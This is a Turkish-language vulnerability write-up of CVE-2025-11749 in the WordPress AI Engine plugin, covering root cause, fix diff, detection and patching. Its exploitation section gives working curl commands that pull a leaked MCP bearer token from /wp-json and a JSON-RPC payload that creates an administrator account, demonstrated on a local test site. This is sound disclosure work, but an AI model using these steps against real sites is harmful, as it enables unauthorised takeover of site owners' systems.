---
title: "CVE: Wordpress AI Engine CVE-2025-11749"
author: b1lal
categories: [CVE, "2025"]
tags: [cve, cve 2025-11749, ai, ai engine, wordpress, plugin, wordpress plugin, information exposure, privilege escalation, research, poc, bearer token, wordfence]
render_with_liquid: false
description: "Wordpress AI Engine eklentisinde bulunan CVE-2025-11749 zafiyetini analiz edeceğiz ve nasıl sömürebileceğimizi öğreneceğiz. - AI Engine <= 3.1.3 - Unauthenticated Sensitive Information Exposure to Privilege Escalation"
media_subpath: /images/ai_engine_cve-2025-11749/
layout: post
published: true  
lang: "tr"
image:
  path: main.png
  alt: "Wordpress AI Engine CVE-2025-11749"
---


AI Engine WordPress eklentisi, yapay zeka destekli içerik oluşturma ve yönetim araçları sunar. Ancak, bu eklentide (<= 3.1.3) kritik bir güvenlik açığı bulunmaktadır (`CVE-2025-11749`). Bu zafiyet, saldırganın **bearer token**'a erişmesine ve ayrıcalık yükseltme saldırıları gerçekleştirmesine olanak tanır. Bu zafiyet araştırmacı <a href="https://www.linkedin.com/in/emiliano-versini" target="_blank">Emiliano Versini</a> tarafından keşfedilmiştir ve CVSS skoru <b style="color: red;">9.8 (Kritik)</b> olarak derecelendirilmiştir.

AI Engine eklentisinin aktif olarak 100.000'den fazla kurulumu bulunmaktadır ve bu zafiyet, birçok WordPress sitesini potansiyel olarak tehlikeye atmaktadır.

![İndirme Sayısı](download.png)

## Zafiyet Detayları

Sorunun temelinde, eklentinin **MCP** arayüzü için sunduğu bir özelliğin hatalı yapılandırılması yatmaktadır. MCP, ChatGPT veya Claude gibi harici yapay zeka modellerinin sitenizle etkileşime girmesi için tasarlanmış bir köprüdür.  

Zafiyetli eklenti, bu harici bağlantı için **'No-Auth URL'** adında, varsayılan olarak kapalı olan bir özellik sunar. Bir yönetici bu özelliği etkinleştirdiğinde, kimlik doğrulama için gizli bir **Bearer Token** içeren API uç noktaları oluşturur.

Kritik hata tam da bu noktada meydana gelir: Eklenti, bu hassas uç noktaları kaydederken, WordPress'e "bu uç noktayı genel API listesinden gizle" anlamına gelen **'show_in_index'** **= false** parametresini göndermeyi ihmal eder.

Bu ihmal sonucunda, **Bearer Token**, sitenin herkese açık olan **/wp-json/** API dizininde düz metin olarak ifşa olur. Kimliği doğrulanmamış herhangi bir saldırgan, tokeni kopyalayabilir, ardından bu tokeni kullanarak MCP uç noktasına bağlanıp **wp_create_user** veya **wp_update_user** gibi komutları çalıştırarak yönetici yetkisinde kullanıcı hesabı oluşturabilirr.


<br>

### Etkilenen Versiyonlar

- **3.1.3** Versiyonu da dahil olmak üzere altında bulunan tüm versiyonlar. *(<= 3.1.3)*
- Yukarıdaki versiyon dahilinde ve **No-Auth URL** özelliğin aktif olduğu sistemler

### Detaylı Teknik Açıklama

Zafiyetin sömürülebilir olması için iki ayarın bir arada etkinleştirilmiş olması gerekir. Bunlardan ilki aşağıdaki resimde görüldüğü gibi **No-Auth URL** özelliğinin etkinleştirilmesidir.

![No-Auth URL Ayarı](no_auth_URL.png)

Daha sonra MCP özellikleri kısmında **WordPress(Recommended)** (*Manage posts, pages, comments, users, media, taxonomies, and WordPress settings.*) seçeneğinin seçilmesi gerekmektedir.

![MCP Özellikleri](mcp_features.png)

Bu özelliği aktif ettiğimizde yapılabilecek tüm işlemler görünmektedir.

![MCP Fonksiyonları](mcp_func.png)

Bu 36 temel işlem arasında kritik olarak aşağıdaki işlemler bulunmaktadır:

- wp_list_plugins
- wp_get_users
- wp_create_user
- wp_update_user
- wp_create_post
- wp_update_post
- wp_delete_post

> Bu işlemlerin kritiklik seviyesi o an içinde bulunulan duruma göre değişiklik gösterebilir. 

Bizim için en kritik olanları **wp_create_user** ve **wp_update_user** işlemleridir. Çünkü bu işlemler sayesinde yönetici yetkisinde yeni bir kullanıcı oluşturabilir veya mevcut bir kullanıcının yetkilerini yükseltebiliriz.


Şimdi zafiyetin kaynağına tekrar gelecek olursak, eklenti MCP uç noktalarını kaydederken **'show_in_index'** parametresini ``false`` olarak ayarlamayı unuttuğu için bu uç noktalar herkese açık hale geldiğinden bahsetmiştik.

Bu durum Bareer Token'ın **/wp-json/** dizininde düz metin olarak ifşa olmasına neden olmaktadır. Bunu doğrulamak için **/wp-json/** dizinine istek gönderdiğimizde aşağıdaki gibi bir çıktı alıyoruz:

![WP Json](wp-json.png)

Namespace kısmında **mcp/v1** ifadesini görüyoruz. Bu, MCP uç noktalarının burada listelendiğini gösterir. 

Peki uç noktaların görüntülenmesine neden olan kod parçasına göz atalım:

```php
// Bu yapı No-AUth URL Etkinleştirildiğinde çalışmaktadır
$noauth_enabled = $this->core->get_option( 'mcp_noauth_url' );
  if ( $noauth_enabled && !empty( $this->bearer_token ) ) {
    register_rest_route( $this->namespace, '/' . $this->bearer_token . '/sse', [
      'methods' => 'GET',
      'callback' => [ $this, 'handle_sse' ],
      'permission_callback' => function ( $request ) {
        return $this->handle_noauth_access( $request );
      },
    ] );

    register_rest_route( $this->namespace, '/' . $this->bearer_token . '/sse', [
      'methods' => 'POST',
      'callback' => [ $this, 'handle_sse' ],
      'permission_callback' => function ( $request ) {
        return $this->handle_noauth_access( $request );
      },
    ] );

    register_rest_route( $this->namespace, '/' . $this->bearer_token . '/messages', [
      'methods' => 'POST',
      'callback' => [ $this, 'handle_message' ],
      'permission_callback' => function ( $request ) {
        return $this->handle_noauth_access( $request );
      },
    ] );
  }
```

WordPress'in **register_rest_route** fonksiyonu, bir dizi seçenek almaktadır. Bu seçeneklerden biriside, rotanın genel API dizininde listelenip listelenmeyeceğini belirleyen ``'show_in_index'`` parametresidir.

Bu kod yapısında, **'show_in_index' => false** parametresi belirtilmemiştir. Varsayılan olarak **true** kabul edilmektedir. Bu nedenle WordPress, bu üç hassas rotayı herkese açık olan ``/wp-json`` adresinde listelemektedirr.

Buradaki zafiyetli noktayı düzenlemek için **show_in_index** değerinin false olarak atanması yeterli olacaktır.

```php
@@ -104,4 +98,5 @@
           return $this->handle_noauth_access( $request );
         },
+        'show_in_index' => false,
       ] );
 
@@ -112,4 +107,5 @@
           return $this->handle_noauth_access( $request );
         },
+        'show_in_index' => false,
       ] );
 
@@ -120,4 +116,5 @@
           return $this->handle_noauth_access( $request );
         },
+        'show_in_index' => false,
       ] ); 
```

<br>


## Nasıl Sömürülür ?

Token değerinin açık bir şekilde ifşa olduğunu gördükten sonra, bu tokeni kullanarak MCP uç noktalarına erişebiliriz. Öncesinde aşağıki gibi bir komutla buradaki token değerini alabiliriz:

```bash
curl -s https://hwkt-local-wp.ddev.site/wp-json | jq '[paths(scalars) as $p | select(getpath($p)|tostring|test("mcp";"i")) | {path:$p,value:getpath($p)}]'
```

Komut Çıktısı : 

```json
[
  ...
  {
    "path": [
      "routes",
      "/mcp/v1/sse",
      "_links",
      "self",
      0,
      "href"
    ],
    "value": "https://hwkt-local-wp.ddev.site/wp-json/mcp/v1/sse"
  },
  {
    "path": [
      "routes",
      "/mcp/v1/messages",
      "namespace"
    ],
    "value": "mcp/v1"
  },
  {
    "path": [
      "routes",
      "/mcp/v1/messages",
      "_links",
      "self",
      0,
      "href"
    ],
    "value": "https://hwkt-local-wp.ddev.site/wp-json/mcp/v1/messages"
  },
  {
    "path": [
      "routes",
      "/mcp/v1/b1lal_secret_token/sse",
      "namespace"
    ],
    "value": "mcp/v1"
  },
  {
    "path": [
      "routes",
      "/mcp/v1/b1lal_secret_token/sse",
      "_links",
      "self",
      0,
      "href"
    ],
    "value": "https://hwkt-local-wp.ddev.site/wp-json/mcp/v1/b1lal_secret_token/sse"
  },
  {
    "path": [
      "routes",
      "/mcp/v1/b1lal_secret_token/messages",
      "namespace"
    ],
    "value": "mcp/v1"
  },
  {
    "path": [
      "routes",
      "/mcp/v1/b1lal_secret_token/messages",
      "_links",
      "self",
      0,
      "href"
    ],
    "value": "https://hwkt-local-wp.ddev.site/wp-json/mcp/v1/b1lal_secret_token/messages"
  }
]
```

Aldığımız çıktıda **token** değerinin ``b1lal_secret_token`` olduğunu görüyoruz.

Bundan sonraki aşamada ele geçiridiğimiz token ile **mcp/v1** altında bulunan **/sse** uç noktasına özel bir istek hazırlayıp göndermektir.

### SSE Nedir ?

> SSE, sunucu tarafından istemciye sürekli olarak veri gönderen bir iletişim protokolüdür. Tipik olarak, bir HTTP bağlantısı üzerinden tek yönlü bir akış sağlar. Bu, sunucunun istemciye anlık güncellemeler göndermesine olanak tanır.

> SSE’nin temel çalışma prensibi basittir. İstemci, bir HTTP bağlantısı oluşturur ve sunucu tarafından gönderilen verileri dinler. Sunucu, bu bağlantı üzerinden periyodik olarak veri gönderir. Bu, istemciye gerçek zamanlı güncellemeleri alabilme imkanı tanır.

<blockquote class="prompt-info"><p><a href="https://gurusalih.medium.com/server-sent-events-sse-ile-ger%C3%A7ek-zamanl%C4%B1-web-uygulamalar%C4%B1-e66f021deab0" target="_blank" rel="noopener noreferrer">Buradan</a> alıntılanmıştır, daha fazla açıklama için mutlaka göz atın. </p>
</blockquote>


Token değerimizi aşağıdaki şekilde değişkene atama işlemi yapıyoruz:

```bash
LEAKED_TOKEN=b1lal_secret_token
```

Daha sonra oluşturmak istediğimiz kullanıcının bilgilerini içeren json yapısını oluşturuyoruz ve **payload.json** olarak kayıt ediyoruz.

```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "wp_create_user",
    "arguments": {
      "user_login": "attacker",
      "user_pass": "P@ssword123!",
      "user_email": "attacker@hwkt.local",
      "role": "administrator"
    }
  },
  "id": "1337"
}
```

Artık saldırıyı gerçekleştirmek için önümüzde engel kalmadı. Yapmamız gereken işlem ``/mcp/v1/b1lal_secret_token/sse`` uç noktasına bu json verisini göndermek olacaktır. Bunu aşağıdaki gibi gerçekleştirebiliriz:

```bash
curl -X POST "https://hwkt-local-wp.ddev.site/wp-json/mcp/v1/${LEAKED_TOKEN}/sse" -H "Content-Type: application/json" -d @payload.json
```

Çalıştırdığımız komutun çıktısı aşağıdaki gibidir.

```bash
{"jsonrpc":"2.0","id":1337,"result":{"content":[{"type":"text","text":"User created ID 2"}]}}
```

Bu sonuç bize kullanıcının başarılı bir şekilde oluşturulduğunu göstermektedir. Bunu veritabanımızı kontrol ederek yada giriş yapmayı deneyerek de doğrulayabiliriz.

```sql
+----+-------------+--------------+---------------------+---------------------+---------------+
| ID | user_login  | display_name | user_email          | user_registered     | roles         |
+----+-------------+--------------+---------------------+---------------------+---------------+
| 1  | b1lal       | b1lal        | admin@hwkt.local    | 2025-10-31 21:19:08 | administrator |
| 2  | attacker    | attacker     | attacker@hwkt.local | 2025-11-08 13:03:00 | administrator |
+----+-------------+--------------+---------------------+---------------------+---------------+
```

<br>

Giriş yapıyoruz: **attacker:P@ssword123!**

<div style="text-align: center;">
  <img src="profile.png" alt="Attacker" />
  <figcaption>Attacker Panel</figcaption>
</div>

> Buradan sonrası saldırganın yeteneklerine bağlıdır :)

<br>

## Tespit 

Sitenizin bu zafiyet için hedef alınıp alınmadığını kontrol etmek için sunucu günlüklerinizi inceleyebilirsiniz.

- ``/wp-json/`` adresine yapılan olağandışı GET isteklerini ve ``/wp-json/mcp/v1/`` altındaki ``/sse`` uç noktalarına yapılan POST isteklerini arayın.
- WordPress kullanıcı günlüklerinde, API üzerinden aniden oluşturulmuş yeni administrator hesapları olup olmadığını kontrol edin.
  
Potansiyel sömürü girişimlerini filtrelemek için aşağıdaki gibi bir sorgu kullanılabilir:

```bash
method:POST AND (path:"/wp-json/mcp/v1/" OR path:"*/mcp/v1/*/sse")
```

<br>

## Önlem ve Güncelleme

Eklentinin **3.1.4** ve daha üstü bir versiyona güncellenmesi gerekmektedir ama sitenizde **No-Auth URL** özelliği aktif ise sadece güncellemeyi tek başına yapmak yeterli olamayabilir.

Güncellemeyi yaptıktan sonra **Bearer Token** daha karmaşık bir değer ile değiştirilmesi gerekmektedir.

Daha sonra Wordpress Admin profil sayfasından **tüm kullanıcılar** sayfasına gidip kullanıcıların kontrol edilmesi gerekmektedir.

<blockquote class="prompt-danger"><p>Saldırgan sistem üzerinde elde etmesi gereken bilgileri topladıktan sonra kullanıcı hesabını silmiş olabileceğini göz önüne almak iyi olacaktır. Bunun için <a href="#tespit" target="_blank" rel="noopener noreferrer">Tespit</a> kısmındaki adımların çok detaylı bir şekilde uygulanması gerekmektedir. </p>
</blockquote>


## Referanslar


- <a href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/ai-engine/ai-engine-313-unauthenticated-sensitive-information-exposure-to-privilege-escalation" target="_blank" rel="noopener noreferrer">Wordfence AI Engine <= 3.1.3</a>
- <a href="https://plugins.trac.wordpress.org/browser/ai-engine/trunk/labs/mcp.php#L226" target="_blank" rel="noopener noreferrer">ai-engine/trunk/labs/mcp.php#L226</a>
- <a href="https://www.esecurityplanet.com/threats/news-wordpress-vulnerability-100k-impact/" target="_blank" rel="noopener noreferrer">Wordpress Vulnerability 100K Impact</a>
- <a href="https://cyberpress.org/privilege-escalation-wordpress-plugin/" target="_blank" rel="noopener noreferrer">Cyber Press</a>
- <a href="https://www.wordfence.com/blog/2025/11/100000-wordpress-sites-affected-by-privilege-escalation-vulnerability-in-ai-engine-wordpress-plugin/" target="_blank" rel="noopener noreferrer">Wordfence Blog</a>
- <a href="https://gurusalih.medium.com/server-sent-events-sse-ile-ger%C3%A7ek-zamanl%C4%B1-web-uygulamalar%C4%B1-e66f021deab0" target="_blank" rel="noopener noreferrer">SSE ?</a>


<p style="font-weight:900; color: gray; font-size: 50px; text-align:center;">Teşekkürler <a href="https://www.linkedin.com/in/batuhan0/?lipi=urn%3Ali%3Apage%3Ad_flagship3_search_srp_people%3BLUebMIsyT%2Fy0mhB736RysA%3D%3D" target="_blank" rel="noopener noreferrer">@batuhaner</a><p>

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
  white-space: pre-wrap;
}

/* body,  h2, h3, h4, h5, h6, p, ul, ol, li, pre, code {
  font-family: 'Open Sans', sans-serif;
} */

.post-desc {
  font-family: 'Open Sans', sans-serif !important;
}

</style>
